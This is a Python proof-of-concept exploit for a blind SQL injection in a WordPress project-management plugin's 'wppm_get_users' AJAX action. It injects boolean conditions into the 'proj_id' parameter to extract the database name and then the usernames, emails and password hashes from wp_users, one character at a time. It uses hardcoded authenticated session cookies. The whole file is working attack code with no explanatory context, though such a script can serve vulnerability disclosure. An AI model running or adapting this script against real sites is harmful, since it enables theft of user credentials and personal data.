import requests

url = "http://localhost/wp-admin/admin-ajax.php"

charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{};:'\",.<>/?\\|`~"

headers = {
    "Host": "localhost",
    "sec-ch-ua-platform": "\"Linux\"",
    "Accept-Language": "en-US,en;q=0.9",
    "sec-ch-ua": "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
    "sec-ch-ua-mobile": "?0",
    "X-Requested-With": "XMLHttpRequest",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "Accept": "*/*",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Origin": "http://localhost",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "http://localhost/wp-admin/admin.php?page=wppm-projects",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive"
}

cookies = {
    "wordpress_86a9106ae65537651a8e456835b316ab": "w41bu1%7C1756998303%7CyS5Gu02l9XqIDn2LLS4f4wACvVIdHof14thVWRZCDmI%7C0895a596f81922d01d640ff95ef453004bacdeb938ef5203dddb6900c8e4be63",
    "wppm_proj_filters": "%7B%22sort_by%22%3A%22project_name%22%2C%22order%22%3A%22ASC%22%2C%22search%22%3A%22%22%2C%22filter%22%3A%22all%22%7D",
    "wp-settings-time-2": "1756631749",
    "wordpress_test_cookie": "WP%20Cookie%20check",
    "wordpress_logged_in_86a9106ae65537651a8e456835b316ab": "w41bu1%7C1756998303%7CyS5Gu02l9XqIDn2LLS4f4wACvVIdHof14thVWRZCDmI%7Cf75813c5e847dab628d6e19c65639aef847546b539f80c1b035b2afacb8f8568",
    "wp-settings-time-1": "1756825510"
}

def check_condition(resp: requests.Response) -> bool:
    return "None" in resp.text

def extract_value(query: str, max_len=64) -> str:
    result = ""
    for i in range(1, max_len + 1):
        found = False
        for ch in charset:
            payload = {
                "action": "wppm_get_users",
                "proj_id": f"(SELECT IF(SUBSTRING(({query}),{i},1)=0x{ch.encode().hex()},999,4))"
            }
            resp = requests.post(url, headers=headers, cookies=cookies, data=payload)
            if check_condition(resp):
                result += ch
                print(f"[+] Pos {i}: {ch} => {result}")
                found = True
                break
        if not found:
            break
    return result

def get_database_name():
    return extract_value("DATABASE()", max_len=32)

def get_user_field(row: int, field: str, max_len=64):
    query = f"SELECT {field} FROM wp_users LIMIT {row},1"
    return extract_value(query, max_len=max_len)

def get_users_data(max_rows=3):
    users = []
    for row in range(max_rows):
        username = get_user_field(row, "user_login", max_len=32)
        if not username:
            break
        email = get_user_field(row, "user_email", max_len=64)
        password = get_user_field(row, "user_pass", max_len=64)
        users.append({"username": username, "email": email, "password": password})
    return users

def main():
    db_name = get_database_name()
    print("[*] Database name:", db_name)

    users_data = get_users_data(max_rows=5)
    for u in users_data:
        print(u)

if __name__ == "__main__":
    main()
